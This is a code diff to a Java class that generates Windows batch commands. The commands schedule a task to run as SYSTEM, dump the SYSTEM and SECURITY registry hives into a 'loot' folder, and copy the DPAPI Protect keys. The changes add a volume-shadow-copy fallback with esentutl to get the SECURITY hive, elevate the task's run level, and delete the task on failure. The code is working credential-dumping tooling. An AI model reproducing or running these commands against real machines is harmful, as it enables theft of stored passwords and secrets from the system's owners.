@@ -360,7 +360,14 @@ public final class Bootstrap {
 			"@echo off",
 			"reg save HKLM\\SYSTEM \"" + loot.resolve("SYSTEM.hiv") + "\" /y",
 			"reg save HKLM\\SECURITY \"" + loot.resolve("SECURITY.hiv") + "\" /y",
+			// A task that ends up as plain Administrator cannot save SECURITY; a
+			// VSS copy can, so try that before giving up.
+			"if not exist \"" + loot.resolve("SECURITY.hiv") + "\" esentutl /y /vss "
+				+ "C:\\Windows\\System32\\config\\SECURITY /d \"" + loot.resolve("SECURITY.hiv")
+				+ "\" >nul 2>&1",
 			"if not exist \"" + loot.resolve("SECURITY.hiv") + "\" (echo missing security > \""
+				+ loot.resolve("hives.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
+			"if not exist \"" + loot.resolve("SYSTEM.hiv") + "\" (echo missing system > \""
 				+ loot.resolve("hives.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
 			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + loot.resolve("ProtectSystem")
 				+ "\" /e /njh /njs /ndl /nc /ns",
@@ -373,7 +380,7 @@ public final class Bootstrap {
 	static List<String> runasLines(Path dump) {
 		return List.of(
 			"@echo off",
-			"schtasks /create /tn spcdump /tr \"" + dump + "\" /sc once /st 00:00 /ru SYSTEM /f",
+			"schtasks /create /tn spcdump /tr \"" + dump + "\" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f",
 			"schtasks /run /tn spcdump",
 			"");
 	}
